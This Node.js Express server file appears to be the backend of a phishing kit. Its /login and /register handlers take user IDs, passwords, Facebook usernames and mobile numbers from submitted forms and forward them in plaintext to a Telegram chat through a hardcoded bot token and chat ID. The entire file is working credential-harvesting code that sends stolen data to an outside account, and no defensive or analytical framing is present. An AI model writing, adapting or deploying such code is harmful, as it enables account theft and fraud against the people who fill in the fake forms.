const express = require('express');
const bodyParser = require('body-parser');
const TelegramBot = require('node-telegram-bot-api');
const path = require('path');
const app = express();

// Replace with your bot token
const TOKEN = 'AAHju4MCVb2CZJalWwbtFwK3VFzYNrI2og0';
const CHAT_ID = '7287970753';

const bot = new TelegramBot(TOKEN, { polling: false });

app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));

// Login Form Handler
app.post('/login', (req, res) => {
  const { userid, password } = req.body;
  const msg = `Login Data:\nUserID: ${userid}\nPassword: ${password}`;
  bot.sendMessage(CHAT_ID, msg);
  res.send('Login data submitted');
});

// Register Form Handler
app.post('/register', (req, res) => {
  const { uid, fbusername, mobile, password } = req.body;
  const msg = `Register Data:\nUID: ${uid}\nFB Username: ${fbusername}\nMobile: ${mobile}\nPassword: ${password}`;
  bot.sendMessage(CHAT_ID, msg);
  res.send('Register data submitted');
});

// Start Server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
